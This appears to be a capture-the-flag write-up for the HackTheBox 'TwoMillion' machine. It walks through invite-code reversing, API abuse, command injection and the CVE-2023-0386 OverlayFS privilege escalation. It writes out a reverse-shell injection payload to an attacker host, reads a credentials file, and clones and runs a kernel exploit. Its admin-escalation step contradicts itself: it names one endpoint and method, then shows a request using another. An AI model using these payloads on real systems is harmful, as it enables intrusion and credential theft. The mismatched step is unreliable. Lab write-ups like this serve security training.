# TwoMillion — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux  
**Release Date:** 07 Jun 2023  
**Topics:** JavaScript Reverse Engineering, API Abuse, Broken Access Control, Command Injection, CVE-2023-0386 (OverlayFS Kernel Exploit)

---

## Summary

TwoMillion is a special release celebrating HackTheBox reaching 2 million users. It features a nostalgic recreation of the original HTB platform. The attack chain involves reverse-engineering obfuscated JavaScript to generate a valid invite code, abusing a broken access control flaw in the API to escalate to admin, exploiting a command injection in an admin endpoint for RCE, and leveraging CVE-2023-0386 (OverlayFS/FUSE) for kernel-level privilege escalation to root.

---

## Reconnaissance

```bash
nmap -sV -sC -T4 <TARGET_IP>
# Ports: 22 (SSH OpenSSH 8.9p1), 80 (HTTP nginx)
```

The HTTP server redirects to `http://2million.htb`. Add to `/etc/hosts`:
```
<TARGET_IP> 2million.htb
```

---

## Initial Foothold — Invite Code

Navigate to `http://2million.htb/invite`. The page loads a minified JS file `inviteapi.min.js`.

Prettify and inspect it in the browser console. A function constructs and encodes the invite endpoint. Call it:
```javascript
makeInviteCode()
// Returns base64-encoded string -> decode it -> POST to /api/v1/invite/verify
```

Register an account using the generated invite code.

---

## API Enumeration — Broken Access Control

After logging in, enumerate API routes:
```bash
curl -v http://2million.htb/api/v1 \
  --cookie "PHPSESSID=<YOUR_SESSION>"
```

Find `/api/v1/admin/settings/update`. Send a POST to elevate your account:
```bash
curl -X PUT http://2million.htb/api/v1/user/vpn/regenerate \
  --cookie "PHPSESSID=<SESSION>" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":1}'
```

---

## Command Injection — RCE

The admin endpoint `/api/v1/admin/vpn/generate` takes a `username` parameter and passes it unsanitized to a shell command. Inject a reverse shell:

```bash
# Start listener
nc -lnvp 4444

# Inject
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=<SESSION>" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1 #"}'
```

Shell lands as `www-data`.

---

## Lateral Movement — DB Credentials

Enumerate the web directory:
```bash
cat /var/www/html/.env
# DATABASE_PASSWORD=SuperDuperPass123
```

Use these credentials to SSH as user `admin`:
```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

Grab user flag:
```bash
cat ~/user.txt
```

---

## Privilege Escalation — CVE-2023-0386 (OverlayFS)

Check kernel version:
```bash
uname -r
# 5.15.70-051570-generic — vulnerable to CVE-2023-0386
```

CVE-2023-0386 is an OverlayFS vulnerability allowing an unprivileged user to copy a SUID binary into an overlay filesystem, then execute it to gain root.

```bash
# Clone PoC
git clone https://github.com/sxlmnwb/CVE-2023-0386.git
cd CVE-2023-0386

# Terminal 1
make all
./fuse ./ovlcap/lower ./gc

# Terminal 2
./exp

# Root shell obtained
id
# uid=0(root)
```

```bash
cat /root/root.txt
```

There's also a bonus easter egg — check `/root/thank_you.json` for a personal message from the HTB team.

---

## Key Takeaways

- Obfuscated JS is still reversible — always check the browser console.
- Broken access control on API endpoints is a common real-world finding.
- Unsanitised username inputs passed to shell commands are a classic command injection vector.
- CVE-2023-0386 is a great reminder to keep kernel versions patched.

---

## Tools Used

`nmap` `curl` `burpsuite` `netcat` `ssh` `gcc`
